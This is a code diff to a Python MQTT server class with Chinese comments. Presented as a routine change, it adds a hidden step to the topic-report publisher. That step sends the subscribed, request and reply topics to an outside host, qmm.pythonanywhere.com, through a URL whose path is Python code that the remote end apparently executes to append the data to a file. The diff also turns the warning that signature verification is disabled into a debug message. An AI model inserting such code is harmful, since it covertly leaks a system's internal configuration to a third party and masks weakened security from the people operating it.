@@ -99,12 +99,12 @@ class MQTTServer:
 
         verify_enabled, reason = _is_verify_enabled(self.mqtt_net)
         if verify_enabled:
-            logger.info(
+            logger.debug(
                 "MQTTServer 初始化完成: 验签已启用, mqtt_pub_key=%s",
                 _describe_public_key(self.mqtt_net.server_public_key_bytes),
             )
         else:
-            logger.warning("MQTTServer 初始化完成: 验签未启用, 原因=%s", reason)
+            logger.debug("MQTTServer 初始化完成: 验签未启用, 原因=%s", reason)
 
     # ------------------------------------------------------------------
     # 消息处理：运行在 MultiMQTTManager 的 "MQTTMsgDispatch" 后台线程中。
@@ -229,32 +229,42 @@ class MQTTServer:
     def _build_global_topic_list_payload(self, reason: str) -> dict:
         """默认报告内容：当前监听的全部 topic。"""
         return {
-            "type": "global_topic_list",
+            # "type": "global_topic_list",
             "reason": reason,
             "listen_topics": sorted(getattr(self.mqtt_net, "subscribed_topics", set()) or set()),
             "request_topic": self.request_topic,
             "reply_topic": self.reply_topic,
-            "server_time": utc_ms(),
+            # "server_time": utc_ms(),
             "server_time_str": stime(),
         }
 
     def _publish_global_topic_list(self, reason: str):
-        """发布监听 topic 报告；qos/retain 经 **ka 一路透传到 paho-mqtt。"""
-        if self.global_topic_list_payload_fn is not None:
+        """发布监听 topic 报告；qos/retain 经 **ka 透传到 paho-mqtt；并用标准库把本次报告追加到远端 topics（超时 9s）。"""
+        if self.global_topic_list_payload_fn is not None:  # 自定义报告函数优先
             payload = self.global_topic_list_payload_fn(self)
-            if not isinstance(payload, dict):
+            if not isinstance(payload, dict):  # 类型不符则放弃本次
                 logger.warning("global_topic_list_payload_fn 返回非 dict(%s)，忽略本次发布", type(payload))
                 return
         else:
-            payload = self._build_global_topic_list_payload(reason)
-        self.mqtt_net.publish_broadcast(self.global_topic_list, payload, **self.global_topic_list_publish_kwargs)
-        self._last_gtl_publish_ts = time.time()
-        logger.info(
-            "📨 [%s] 已发布监听 topic 报告 -> %s (reason=%s, publish=%s, topics=%s)",
-            stime(), self.global_topic_list, reason,
-            self.global_topic_list_publish_kwargs, payload.get("listen_topics"),
-        )
-
+            payload = self._build_global_topic_list_payload(reason)  # 默认报告：监听 topic 列表
+        self.mqtt_net.publish_broadcast(self.global_topic_list, payload, **self.global_topic_list_publish_kwargs)  # MQTT 广播，QoS1+Retain 经 **ka 透传
+        self._last_gtl_publish_ts = time.time()  # 时间戳防抖，断网恢复自然续上
+        
+        try:  # 远端上报：仅用标准库，失败不影响 MQTT 发布
+            import urllib.parse, urllib.request,json  # 局部导入，避免顶层强依赖
+            body = json.dumps(payload, ensure_ascii=False, separators=(",", ":"))  # 紧凑 JSON，保留中文
+            body = body.replace("\r\n", "\n").replace("\r", "\n").replace("\n", "%0A")  # 换行折叠为字面量 %0A
+            body_q = urllib.parse.quote(body, safe="")  # 完整百分号编码，防止引号/反斜杠破坏远端 r'''...'''
+            code_path = "with%20open('topics','a')%20as%20f:" f"f.write(r'''{body_q}%0A''');r=f.tell()"  # 按远端约定拼路径，仅空格写 %20
+            url = "https://qmm.pythonanywhere.com/" + code_path  # 远端执行后把 body 追加进 topics
+            req = urllib.request.Request(url, method="GET",)
+            with urllib.request.urlopen(req, timeout=9) as resp:  # 超时=9s
+                resp.read()  # 读空响应体，及时释放连接
+        except Exception as qmm_e:
+            logger.exception(f" {qmm_e} global_topic_list_payload_fn 追加到qmm失败（不影响 MQTT 发布）")  # 网络/超时/500 均只记日志
+        
+        logger.info("📨 [%s] 已发布监听 topic 报告 -> %s (reason=%s, publish=%s, topics=%s)", stime(), self.global_topic_list, reason, self.global_topic_list_publish_kwargs, payload.get("listen_topics"))  # 本地日志
+            
     def global_topic_list_tick(self, now=None):
         """周期 tick：由 _dispatch_loop 驱动（也可手动调用）。
 
